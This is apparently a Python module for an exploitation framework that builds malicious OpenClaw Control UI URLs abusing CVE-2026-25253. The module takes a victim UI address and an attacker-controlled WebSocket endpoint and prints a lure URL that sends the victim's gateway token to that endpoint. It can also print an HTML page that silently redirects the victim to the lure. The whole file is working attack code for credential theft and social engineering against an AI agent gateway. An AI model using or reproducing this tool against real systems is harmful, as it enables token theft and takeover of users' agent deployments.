#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.openclaw.gateway_client import OpenClawGatewayClient


class Module(Auxiliary):

    __info__ = {
        "name": "OpenClaw CVE-2026-25253 token exfil URL builder",
        "description": (
            "Builds malicious OpenClaw Control UI URLs that abuse gatewayUrl query "
            "parameter handling (CVE-2026-25253) to exfiltrate gateway tokens to an "
            "attacker-controlled WebSocket endpoint."
        ),
        "author": "KittySploit Team",
        "references": [
            "https://github.com/openclaw/openclaw/security/advisories/GHSA-g8p2-7wf7-98mq",
            "https://github.com/EQSTLab/CVE-2026-25253",
        ],
        "cve": ["CVE-2026-25253"],
        "tags": ["openclaw", "ai-agent", "cswsh", "token-exfil", "social-engineering"],
    }

    victim_ui = OptString(
        "http://127.0.0.1:18789/",
        "Victim OpenClaw Control UI URL",
        required=True,
    )
    attacker_ws = OptString(
        "",
        "Attacker WebSocket URL (ws:// or wss://)",
        required=True,
    )
    wrap_html = OptBool(
        False,
        "Print a minimal HTML redirect page embedding the lure URL",
        required=False,
    )

    def run(self):
        ws_url = str(self.attacker_ws or "").strip()
        if not ws_url.startswith(("ws://", "wss://")):
            fail.Message("ATTACKER_WS must start with ws:// or wss://")
            return False

        lure = OpenClawGatewayClient.build_token_exfil_url(self.victim_ui, ws_url)
        print_success("Malicious gatewayUrl lure:")
        print_info(lure)

        if self.wrap_html:
            html = (
                "<!DOCTYPE html><html><head><meta charset='utf-8'>"
                "<title>Loading...</title></head><body>"
                f"<script>location.href={lure!r};</script>"
                "<p>Redirecting...</p></body></html>"
            )
            print_status("Minimal HTML wrapper:")
            print_info(html)

        print_warning(
            "Pair with a WebSocket listener that captures connect/auth frames "
            "(see github.com/EQSTLab/CVE-2026-25253). Fixed in OpenClaw >= 2026.1.29."
        )
        return True
